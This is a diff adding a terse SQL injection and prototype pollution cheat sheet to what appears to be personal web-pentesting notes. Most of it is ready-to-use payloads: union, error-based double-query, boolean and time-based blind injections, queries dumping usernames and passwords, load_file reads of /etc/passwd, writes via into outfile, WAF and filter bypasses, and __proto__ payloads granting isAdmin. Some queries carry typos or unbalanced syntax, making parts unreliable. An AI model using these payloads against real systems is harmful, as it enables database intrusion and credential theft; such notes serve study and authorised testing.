@@ -565,6 +565,421 @@ direct access to url like /Admin
                                                           select * from users where id=1;
 
 
+
+1. error based
+2. union based
+
+3. Blind 
+
+   1. boolean based
+   2. time based
+   3. out of band
+4. second order 
+
+
+
+Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection
+
+
+
+ However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
+
+    In UPDATE statements, within the updated values or the WHERE clause.
+    In INSERT statements, within the inserted values.
+    In SELECT statements, within the table or column name.
+    In SELECT statements, within the ORDER BY clause.
+
+
+    https://insecure-website.com/products?category=Gifts'--
+    https://insecure-website.com/products?category=Gifts'+OR+1=1--
+    https://insecure-website.com/products?category='+OR+1=1--
+
+    submitting the username administrator'-- and a blank password
+
+
+
+       Error Based SQLI 
+
+
+    Union Based - https://portswigger.net/web-security/sql-injection/union-attacks
+
+
+     When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack. 
+
+
+
+
+     Determining the number of columns required
+
+
+     ' ORDER BY 1--
+     ' ORDER BY 2--
+     ' ORDER BY 3--    
+
+      ' UNION SELECT NULL--
+      ' UNION SELECT NULL,NULL--
+      ' UNION SELECT NULL,NULL,NULL--
+      ' UNION SELECT NULL,'qwqw',NULL--
+
+      ' UNION SELECT 1,2,3--
+      ' UNION SELECT 2--
+      ' UNION SELECT 3--
+
+
+
+
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%201,table_name,3%20FROM%20infromation_schema.tables%20where%20table_schema=database()
+http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name,3%20FROM%20information_schema.tables%20where%20table_schema=database()
+
+
+
+                                                      error based blind / Double query injection ( use when no return but only as errors)
+
+
+
+we can use AND/OR if comments are blocked ' UNION SELECT 1,2,3 AND '1
+                                          ' UNION SELECT 1,2,3 AND 1='1
+
+' UNION SELECT 1,2,     3 AND '1  --  will always return a true statement and hence will print 1 
+
+
+
+
+ 
+while injecting in webapp use peranthesis
+
+select database();
+select (select database());
+select concat(select database());
+select concat(0x3a,(select database()),0x3a);
+select concat(0x3a,(select database()),0x3a, floor(rand()*2));
+select concat(0x3a,(select database()),0x3a, floor(rand()*2)a;
+select concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.tables; 
+select concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns; 
+select count(*), concat(0x3a,(select database()),0x3a), floor(rand()*2)) from information_schema.columns;
+select count(*), concat(0x3a,(select version()),0x3a, floor(rand()*2))a from information_schema.columns;
+select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns;
+select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns group by a;
+select 1 from (select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;
+select 1 from (select count(*), concat(0x3a,(select column_name from information_schema.columns where table_name='users' limit 6,1),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;
+select 1 from (select count(*), concat(0x3a,(select password from users),0x3a, floor(rand()*2))a from information_schema.columns group by a)b;
+
+
+1'\")
+1'
+1\
+1'    --+
+
+1' AND  --+
+
+1' AND (select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a) --+
+
+1' AND (select 1 from(select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a)) --+
+1' AND (select 1 from(select count(*), concat(0x3a,(select database()),0x3a, floor(rand()*2)) from information_schema.columns group by a)b) --+
+1' AND (select 1 from(select count(*), concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a, floor(rand()*2)) from information_schema.columns group by a)b) --+
+
+
+
+
+
+
+select 1 from (select count(*), concat(0x3a,(select column_name from information_schema.columns where table_name='users'),0x3a,floor (rand()*2))a from information_schema.columns group by a)b;
+
+
+
+
+
+
+                                                                        blind boolean based
+
+1' 
+1' --+
+1' AND 0 --+
+1' AND 1 --+
+
+1' AND   1 > 10    --+
+
+1' AND   (ascii(substr((select database()),3,1))) = 99 --+
+
+1' AND   (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))) = 99 --+
+
+
+
+
+                                                                     TIME Based
+
+
+1' and sleep(10)--+
+
+select if ((select version()) like "13%", sleep(10), null);
+while injecting in webapp use peranthesis  (select if ((select version()) like "13%", sleep(10), null);)
+select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', like "13%", sleep(10), null); - like might also work
+select if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e', sleep(10), null);
+
+
+
+
+                                                                     out file
+
+
+
+1'    --+
+1')   --+
+1'))  --+
+select * from users into outfile "/tmp/test.txt"
+select * from users into dumpfile "/tmp/test.txt"
+select load_file("/etc/passwd");
+select load_file("/etc/passwd") into outfile "/tmp/eee";
+artists.php?artist=-1 union select 1,2,3 into outfile "/hj/var/www/test1.txt" --+
+artists.php?artist=-1 union select 1,database(),version() into outfile "/hj/var/www/test1.txt" --+
+artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables into outfile "/hj/var/www/test1.txt" --+
+artists.php?artist=-1 union select 1,username,password from users into outfile "/hj/var/www/test1.txt" --+
+
+
+
+
+
+                                                            Error based double quotes / login page / post parameter - ( only when error is visible on screen )
+
+
+")    #
+
+")  1=1 # 
+
+")  or 1 # 
+
+")  1=1  LIMIT 3,1  #  
+
+")   ORDER BY 2 #
+
+")  UNION SELECT 1,2   #
+
+")  UNION SELECT DATABASE(), version()  #
+
+so on ....
+
+
+
+
+
+                                                         Where clause of UPDATE query / double query injection
+
+check in password feild '  
+
+admin
+'
+
+admin
+'  or 1=1 #
+
+
+
+                                                                         User agent field / Insert query 
+
+
+
+
+'
+"
+\
+
+'  or '1'='1
+
+error based sqli 
+
+                                                                        cookie based sqli 
+
+
+
+fire bug / tamper data / foxy proxy / developer tools extn / hack bar 
+
+'
+"
+\
+
+' or 1=1 #
+
+' order by 1
+
+
+error based sqli 
+
+' union select 1,2,3 #
+
+' union select 1,database(),3 #
+
+error based sqli 
+
+
+
+
+                                                                     second order sqli 
+
+
+
+signup
+admin' --
+1234
+
+
+update password
+
+asdf
+asdf
+
+admin user password will be updated consideing admin' --
+
+
+
+
+
+
+                                                                  bypass filter
+
+
+OR filter - use ||
+
+AND filter - use &&  use url encode      1' %26%26 1=0 --+   
+
+space filter -  %A0 also ()
+
+3') AND  %0a ('1
+
+3')%0a unIon %0a SeLecT (1),(2),(3)%0aAND  %0a ('1
+
+
+
+
+
+                                                                  HTTP Parameter pollution
+
+you can try waf bypass using HPP waf will not validate extra parameter we have added and we can inject there
+
+index.php?id=1&id=8  - diffent in jsp & php
+
+
+
+
+
+enode to various encoding scheme
+
+'  to some wierd character in UTF-16, utf-32,%bf%27,%af%27
+
+
+
+
+
+                                                                  Prototype pollution
+
+
+
+XSS
+
+first check js files used in debugger/source - developer tools
+
+try in URL -   /?__proto__[foo]=bar
+
+in console - Object.prototype 
+
+
+
+
+
+serverside
+
+
+privilege escalation
+
+{
+   
+   "some value" : "123"
+   "some value2" : "345"
+   "foo" : "bar"
+   "__proto__" :{
+   "isAdmin" :true
+   }
+
+}
+
+
+status code override
+
+{
+   
+   "some value" : "123"
+   "some value2" : "345"
+   "__proto__" :{
+   "status : 555
+   }
+
+}
+
+
+
+
+json space - check burp raw , if it doesn't have space try this . if then if is having space it is vunlerable .
+
+
+{
+   
+   "some value" : "123"
+   "some value2" : "345"
+   "__proto__" :{
+   "json spaces" :100
+   }
+
+}
+
+
+
+charset overide -  country value should be US if prototype pollution exists
+
+
+
+{
+   
+   "some value" : "123"
+   "some value2" : "345"
+   "country": "+AFU-+AEs-"
+   "__proto__" :{
+   "content-type" : "application/json; charset=utf-7" 
+   }
+
+}
+
+
+
+
+
+validation bypass
+
+
+
+
+{
+   
+   "some value" : "123"
+   "some value2" : "345"
+   "constructor":{
+   "prototype" :{
+   "polluted" :true
+   }
+   }
+
+}
+
+
+
+
+
+data exfiltration & RCE 
+
+
+check hacktricks
+
+
+
                         28. Race condition
 
                         29. NO-SQL 
